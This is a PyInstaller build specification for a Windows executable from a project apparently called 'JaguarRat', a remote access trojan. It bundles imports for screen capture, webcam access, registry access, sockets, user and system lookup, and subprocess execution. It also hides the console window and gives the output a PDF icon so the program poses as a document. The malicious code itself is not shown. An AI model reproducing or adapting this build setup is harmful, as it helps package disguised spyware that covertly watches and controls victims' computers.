# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['../_entry.py'],
    pathex=['c:/Users/personal/JaguarRat/build_jaguar'],
    binaries=[],
    datas=[],
    hiddenimports=['PIL', 'PIL.Image', 'PIL.ImageGrab', 'cv2', 'winreg', 'io', 'time', 'base64', 'socket', 'getpass', 'platform', 'shutil', 'subprocess'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='Run',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=False,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=['C:/Users/personal/JaguarRat/img/pdf.ico'],
)
